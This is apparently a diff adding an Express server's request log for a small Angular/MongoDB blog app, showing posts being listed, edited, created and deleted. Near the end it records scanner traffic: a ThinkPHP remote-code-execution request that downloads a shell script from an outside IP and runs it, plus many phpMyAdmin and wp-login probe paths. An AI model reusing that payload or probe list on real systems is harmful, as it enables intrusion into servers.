@@ -93,3 +93,845 @@ Fetching all blog documents
     createdOn: 2019-04-02T03:25:49.791Z,
     __v: 0 } ]
 [0mGET /api/blogs [36m304 [0m2.807 ms - -[0m
+[0mGET / [36m304 [0m0.807 ms - -[0m
+[0mGET /js/angular.min.js [36m304 [0m0.898 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m0.685 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.302 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.036 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.321 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.794 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.691 ms - -[0m
+[0mGET / [36m304 [0m0.487 ms - -[0m
+[0mGET /js/angular.min.js [36m304 [0m0.819 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.946 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m2.461 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.035 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.327 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.727 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.534 ms - -[0m
+[0mGET / [32m200 [0m0.627 ms - 5247[0m
+[0mGET /js/angular.min.js [36m304 [0m0.844 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.615 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.784 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m1.418 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.306 ms - -[0m
+[0mGET / [36m304 [0m0.447 ms - -[0m
+[0mGET /js/angular.min.js [36m304 [0m0.815 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m1.195 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.215 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.510 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.305 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.593 ms - -[0m
+Finding blog details { blogID: '5ca2d626c928d770d7395c1f' }
+{ _id: 5ca2d626c928d770d7395c1f,
+  blogTitle: 'Blog #1',
+  blogText: 'My first blog post.',
+  createdOn: 2019-04-02T03:25:25.997Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d626c928d770d7395c1f [32m200 [0m2.281 ms - 136[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.580 ms - -[0m
+Finding blog details { blogID: '5ca2d632c928d770d7395c20' }
+{ _id: 5ca2d632c928d770d7395c20,
+  blogTitle: 'Blog #2',
+  blogText: 'My second blog post.',
+  createdOn: 2019-04-02T03:25:38.495Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d632c928d770d7395c20 [32m200 [0m2.391 ms - 137[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.648 ms - -[0m
+Finding blog details { blogID: '5ca2d632c928d770d7395c20' }
+{ _id: 5ca2d632c928d770d7395c20,
+  blogTitle: 'Blog #2',
+  blogText: 'My second blog post.',
+  createdOn: 2019-04-02T03:25:38.495Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d632c928d770d7395c20 [36m304 [0m2.323 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m3.066 ms - -[0m
+Finding blog details { blogID: '5ca2d63dc928d770d7395c21' }
+{ _id: 5ca2d63dc928d770d7395c21,
+  blogTitle: 'Blog #3',
+  blogText: 'My third blog post.',
+  createdOn: 2019-04-02T03:25:49.791Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d63dc928d770d7395c21 [32m200 [0m2.274 ms - 136[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.611 ms - -[0m
+[0mGET / [32m200 [0m0.599 ms - 5247[0m
+[0mGET / [32m200 [0m0.623 ms - 5247[0m
+[0mGET / [32m200 [0m4.951 ms - 5247[0m
+[0mGET / [32m200 [0m0.602 ms - 5247[0m
+[0mGET /stylesheets/style.css [32m200 [0m1.141 ms - 111[0m
+[0mGET /js/angular-route.min.js [32m200 [0m2.293 ms - 5721[0m
+[0mGET /blogApp.js [32m200 [0m2.622 ms - 4289[0m
+[0mGET /js/angular.min.js [32m200 [0m4.916 ms - 176241[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m4.650 ms - 155758[0m
+[0mGET /favicon.ico [32m200 [0m3.537 ms - 5247[0m
+Fetching all blog documents
+[0mGET /favicon.ico [36m304 [0m0.683 ms - -[0m
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post.',
+    createdOn: 2019-04-02T03:25:25.997Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [32m200 [0m41.670 ms - 413[0m
+Finding blog details { blogID: '5ca2d626c928d770d7395c1f' }
+{ _id: 5ca2d626c928d770d7395c1f,
+  blogTitle: 'Blog #1',
+  blogText: 'My first blog post.',
+  createdOn: 2019-04-02T03:25:25.997Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d626c928d770d7395c1f [32m200 [0m10.369 ms - 136[0m
+[0mGET /favicon.ico [36m304 [0m0.660 ms - -[0m
+[0mPOST / [32m200 [0m16.146 ms - 5247[0m
+[0mPUT /api/blogs/5ca2d626c928d770d7395c1f [32m200 [0m69.553 ms - 136[0m
+[0mGET /js/angular-route.min.js [36m304 [0m0.869 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.275 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.604 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.551 ms - -[0m
+[0mGET /js/angular.min.js [36m304 [0m2.631 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post1',
+    createdOn: 2019-04-02T09:38:05.646Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [32m200 [0m2.586 ms - 413[0m
+[0mGET /favicon.ico [36m304 [0m0.617 ms - -[0m
+Finding blog details { blogID: '5ca2d626c928d770d7395c1f' }
+{ _id: 5ca2d626c928d770d7395c1f,
+  blogTitle: 'Blog #1',
+  blogText: 'My first blog post1',
+  createdOn: 2019-04-02T09:38:05.646Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d626c928d770d7395c1f [32m200 [0m4.896 ms - 136[0m
+[0mGET /favicon.ico [36m304 [0m0.629 ms - -[0m
+[0mPOST / [32m200 [0m5.544 ms - 5247[0m
+[0mPUT /api/blogs/5ca2d626c928d770d7395c1f [32m200 [0m8.405 ms - 136[0m
+[0mGET /js/angular.min.js [36m304 [0m0.832 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.297 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m1.141 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.558 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.300 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [32m200 [0m2.547 ms - 413[0m
+[0mGET /favicon.ico [36m304 [0m0.630 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.745 ms - -[0m
+{ title: 'Prof blog', text: 'Test', date: 1554197904904 }
+[0mPOST / [32m200 [0m5.747 ms - 5247[0m
+{ _id: 5ca32d90338003710cc4ab93,
+  blogTitle: 'Prof blog',
+  blogText: 'Test',
+  createdOn: 2019-04-02T09:38:24.904Z,
+  __v: 0 }
+[0mPOST /api/blogs/ [32m201 [0m8.866 ms - 123[0m
+[0mGET /js/angular.min.js [36m304 [0m0.762 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m0.688 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.251 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.463 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.079 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 },
+  { _id: 5ca32d90338003710cc4ab93,
+    blogTitle: 'Prof blog',
+    blogText: 'Test',
+    createdOn: 2019-04-02T09:38:24.904Z,
+    __v: 0 } ]
+[0mGET /api/blogs [32m200 [0m4.204 ms - 537[0m
+[0mGET /favicon.ico [36m304 [0m4.223 ms - -[0m
+Finding blog details { blogID: '5ca32d90338003710cc4ab93' }
+{ _id: 5ca32d90338003710cc4ab93,
+  blogTitle: 'Prof blog',
+  blogText: 'Test',
+  createdOn: 2019-04-02T09:38:24.904Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca32d90338003710cc4ab93 [32m200 [0m2.218 ms - 123[0m
+[0mGET /favicon.ico [36m304 [0m2.461 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 },
+  { _id: 5ca32d90338003710cc4ab93,
+    blogTitle: 'Prof blog',
+    blogText: 'Test',
+    createdOn: 2019-04-02T09:38:24.904Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.840 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.622 ms - -[0m
+Finding blog details { blogID: '5ca32d90338003710cc4ab93' }
+{ _id: 5ca32d90338003710cc4ab93,
+  blogTitle: 'Prof blog',
+  blogText: 'Test',
+  createdOn: 2019-04-02T09:38:24.904Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca32d90338003710cc4ab93 [36m304 [0m2.879 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m2.841 ms - -[0m
+[0mGET /? [32m200 [0m0.604 ms - 5247[0m
+(node:28940) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
+Blog ID 5ca32d90338003710cc4ab93 deleted
+[0mDELETE /api/blogs/5ca32d90338003710cc4ab93 [32m204 [0m7.797 ms - -[0m
+[0mGET /js/angular.min.js [36m304 [0m3.969 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m3.925 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.323 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.806 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.303 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [32m200 [0m2.540 ms - 413[0m
+[0mGET /favicon.ico [36m304 [0m0.615 ms - -[0m
+[0mGET / [36m304 [0m0.436 ms - -[0m
+[0mGET / [32m200 [0m0.497 ms - 5247[0m
+[0mGET /favicon.ico [32m200 [0m1.517 ms - 5247[0m
+[0mGET / [32m200 [0m0.530 ms - 5247[0m
+[0mGET / [32m200 [0m0.586 ms - 5247[0m
+[0mGET /phpmyadmin [32m200 [0m0.908 ms - 5247[0m
+[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://82.212.70.218/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a; [32m200 [0m1.565 ms - 5247[0m
+[0mHEAD http://112.124.42.80:63435/ [32m200 [0m1.137 ms - 5247[0m
+[0mGET / [32m200 [0m0.566 ms - 5247[0m
+[0mGET / [32m200 [0m0.587 ms - 5247[0m
+[0mGET / [32m200 [0m0.637 ms - 5247[0m
+[0mGET / [32m200 [0m0.565 ms - 5247[0m
+[0mGET /stylesheets/style.css [32m200 [0m2.601 ms - 111[0m
+[0mGET /blogApp.js [32m200 [0m2.341 ms - 4289[0m
+[0mGET /js/angular-route.min.js [32m200 [0m4.554 ms - 5721[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m4.622 ms - 155758[0m
+[0mGET /js/angular.min.js [32m200 [0m5.001 ms - 176241[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [32m200 [0m2.623 ms - 413[0m
+Finding blog details { blogID: '5ca2d626c928d770d7395c1f' }
+{ _id: 5ca2d626c928d770d7395c1f,
+  blogTitle: 'Blog #1',
+  blogText: 'My first blog post!',
+  createdOn: 2019-04-02T09:38:11.400Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d626c928d770d7395c1f [32m200 [0m2.144 ms - 136[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.422 ms - -[0m
+Finding blog details { blogID: '5ca2d632c928d770d7395c20' }
+{ _id: 5ca2d632c928d770d7395c20,
+  blogTitle: 'Blog #2',
+  blogText: 'My second blog post.',
+  createdOn: 2019-04-02T03:25:38.495Z,
+  __v: 0 }
+[0mGET /api/blogs/5ca2d632c928d770d7395c20 [32m200 [0m2.137 ms - 137[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.385 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m2.567 ms - -[0m
+Fetching all blog documents
+[ { _id: 5ca2d626c928d770d7395c1f,
+    blogTitle: 'Blog #1',
+    blogText: 'My first blog post!',
+    createdOn: 2019-04-02T09:38:11.400Z,
+    __v: 0 },
+  { _id: 5ca2d632c928d770d7395c20,
+    blogTitle: 'Blog #2',
+    blogText: 'My second blog post.',
+    createdOn: 2019-04-02T03:25:38.495Z,
+    __v: 0 },
+  { _id: 5ca2d63dc928d770d7395c21,
+    blogTitle: 'Blog #3',
+    blogText: 'My third blog post.',
+    createdOn: 2019-04-02T03:25:49.791Z,
+    __v: 0 } ]
+[0mGET /api/blogs [36m304 [0m3.036 ms - -[0m
+[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [32m200 [0m0.921 ms - 5247[0m
+[0mGET /phpMyAdmin/scripts/setup.php [32m200 [0m0.925 ms - 5247[0m
+[0mGET / [32m200 [0m11.909 ms - 5247[0m
+[0mGET / [32m200 [0m10.562 ms - 5247[0m
+[0mGET /manager/html [32m200 [0m2.558 ms - 5247[0m
+[0mHEAD /robots.txt [32m200 [0m1.174 ms - 5247[0m
+[0mGET / [32m200 [0m0.551 ms - 5247[0m
+[0mGET /stylesheets/style.css [32m200 [0m1.587 ms - 111[0m
+[0mGET /favicon.ico [32m200 [0m0.847 ms - 5247[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.546 ms - 111[0m
+[0mGET /favicon.ico [32m200 [0m0.830 ms - 5247[0m
+[0mGET /mysite/wp-login.php [32m200 [0m0.922 ms - 5247[0m
+[0mGET /forums/wp-login.php [32m200 [0m0.855 ms - 5247[0m
+[0mGET /forums/wp-login.php [32m200 [0m0.844 ms - 5247[0m
+[0mGET /new/wp-login.php [32m200 [0m0.908 ms - 5247[0m
+[0mGET / [32m200 [0m0.611 ms - 5247[0m
+[0mGET /new/wp-login.php [32m200 [0m0.929 ms - 5247[0m
+[0mGET /admin/wp-login.php [32m200 [0m0.888 ms - 5247[0m
+[0mGET /phpMyAdmin/scripts/setup.php [32m200 [0m1.483 ms - 5247[0m
+[0mGET / [32m200 [0m0.624 ms - 5247[0m
+[0mGET / [32m200 [0m0.532 ms - 5247[0m
+[0mGET /admin/wp-login.php [32m200 [0m0.872 ms - 5247[0m
+[0mGET /news/wp-login.php [32m200 [0m0.887 ms - 5247[0m
+[0mGET /mysql/admin/index.php?lang=en [32m200 [0m0.922 ms - 5247[0m
+[0mGET /mysql/dbadmin/index.php?lang=en [32m200 [0m0.872 ms - 5247[0m
+[0mGET /mysql/sqlmanager/index.php?lang=en [32m200 [0m1.571 ms - 5247[0m
+[0mGET /mysql/mysqlmanager/index.php?lang=en [32m200 [0m0.837 ms - 5247[0m
+[0mGET /phpmyadmin/index.php?lang=en [32m200 [0m0.811 ms - 5247[0m
+[0mGET /phpMyadmin/index.php?lang=en [32m200 [0m0.768 ms - 5247[0m
+[0mGET /phpMyAdmin/index.php?lang=en [32m200 [0m0.846 ms - 5247[0m
+[0mGET /phpmyAdmin/index.php?lang=en [32m200 [0m0.802 ms - 5247[0m
+[0mGET /phpmyadmin2/index.php?lang=en [32m200 [0m3.420 ms - 5247[0m
+[0mGET /phpmyadmin3/index.php?lang=en [32m200 [0m0.796 ms - 5247[0m
+[0mGET /phpmyadmin4/index.php?lang=en [32m200 [0m0.782 ms - 5247[0m
+[0mGET /2phpmyadmin/index.php?lang=en [32m200 [0m0.853 ms - 5247[0m
+[0mGET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en [32m200 [0m0.901 ms - 5247[0m
+[0mGET /phpmy/index.php?lang=en [32m200 [0m0.882 ms - 5247[0m
+[0mGET /phppma/index.php?lang=en [32m200 [0m0.848 ms - 5247[0m
+[0mGET /myadmin/index.php?lang=en [32m200 [0m0.929 ms - 5247[0m
+[0mGET /shopdb/index.php?lang=en [32m200 [0m1.761 ms - 5247[0m
+[0mGET /MyAdmin/index.php?lang=en [32m200 [0m0.852 ms - 5247[0m
+[0mGET /program/index.php?lang=en [32m200 [0m0.757 ms - 5247[0m
+[0mGET /PMA/index.php?lang=en [32m200 [0m0.774 ms - 5247[0m
+[0mGET /dbadmin/index.php?lang=en [32m200 [0m0.807 ms - 5247[0m
+[0mGET /pma/index.php?lang=en [32m200 [0m1.689 ms - 5247[0m
+[0mGET /db/index.php?lang=en [32m200 [0m0.714 ms - 5247[0m
+[0mGET /admin/index.php?lang=en [32m200 [0m0.723 ms - 5247[0m
+[0mGET /mysql/index.php?lang=en [32m200 [0m0.784 ms - 5247[0m
+[0mGET /database/index.php?lang=en [32m200 [0m0.752 ms - 5247[0m
+[0mGET /db/phpmyadmin/index.php?lang=en [32m200 [0m0.700 ms - 5247[0m
+[0mGET /db/phpMyAdmin/index.php?lang=en [32m200 [0m0.779 ms - 5247[0m
+[0mGET /sqlmanager/index.php?lang=en [32m200 [0m0.859 ms - 5247[0m
+[0mGET /mysqlmanager/index.php?lang=en [32m200 [0m0.886 ms - 5247[0m
+[0mGET /php-myadmin/index.php?lang=en [32m200 [0m2.221 ms - 5247[0m
+[0mGET /phpmy-admin/index.php?lang=en [32m200 [0m1.195 ms - 5247[0m
+[0mGET /mysqladmin/index.php?lang=en [32m200 [0m0.745 ms - 5247[0m
+[0mGET /mysql-admin/index.php?lang=en [32m200 [0m0.711 ms - 5247[0m
+[0mGET /admin/phpmyadmin/index.php?lang=en [32m200 [0m0.705 ms - 5247[0m
+[0mGET /admin/phpMyAdmin/index.php?lang=en [32m200 [0m0.733 ms - 5247[0m
+[0mGET /admin/sysadmin/index.php?lang=en [32m200 [0m0.707 ms - 5247[0m
+[0mGET /admin/sqladmin/index.php?lang=en [32m200 [0m0.683 ms - 5247[0m
+[0mGET /admin/db/index.php?lang=en [32m200 [0m0.738 ms - 5247[0m
+[0mGET /admin/web/index.php?lang=en [32m200 [0m0.719 ms - 5247[0m
+[0mGET /admin/pMA/index.php?lang=en [32m200 [0m0.746 ms - 5247[0m
+[0mGET /mysql/pma/index.php?lang=en [32m200 [0m0.721 ms - 5247[0m
+[0mGET /mysql/db/index.php?lang=en [32m200 [0m2.708 ms - 5247[0m
+[0mGET /mysql/web/index.php?lang=en [32m200 [0m0.824 ms - 5247[0m
+[0mGET /mysql/pMA/index.php?lang=en [32m200 [0m0.845 ms - 5247[0m
+[0mGET /sql/phpmanager/index.php?lang=en [32m200 [0m0.865 ms - 5247[0m
+[0mGET /sql/php-myadmin/index.php?lang=en [32m200 [0m0.741 ms - 5247[0m
+[0mGET /sql/phpmy-admin/index.php?lang=en [32m200 [0m0.697 ms - 5247[0m
+[0mGET /sql/sql/index.php?lang=en [32m200 [0m0.792 ms - 5247[0m
+[0mGET /sql/myadmin/index.php?lang=en [32m200 [0m0.797 ms - 5247[0m
+[0mGET /sql/webadmin/index.php?lang=en [32m200 [0m0.782 ms - 5247[0m
+[0mGET /sql/sqlweb/index.php?lang=en [32m200 [0m0.764 ms - 5247[0m
+[0mGET /sql/websql/index.php?lang=en [32m200 [0m0.713 ms - 5247[0m
+[0mGET /sql/webdb/index.php?lang=en [32m200 [0m0.761 ms - 5247[0m
+[0mGET /sql/sqladmin/index.php?lang=en [32m200 [0m0.722 ms - 5247[0m
+[0mGET /sql/sql-admin/index.php?lang=en [32m200 [0m0.791 ms - 5247[0m
+[0mGET /sql/phpmyadmin2/index.php?lang=en [32m200 [0m0.809 ms - 5247[0m
+[0mGET /sql/phpMyAdmin2/index.php?lang=en [32m200 [0m0.790 ms - 5247[0m
+[0mGET /sql/phpMyAdmin/index.php?lang=en [32m200 [0m0.757 ms - 5247[0m
+[0mGET /db/myadmin/index.php?lang=en [32m200 [0m5.313 ms - 5247[0m
+[0mGET /db/webadmin/index.php?lang=en [32m200 [0m0.798 ms - 5247[0m
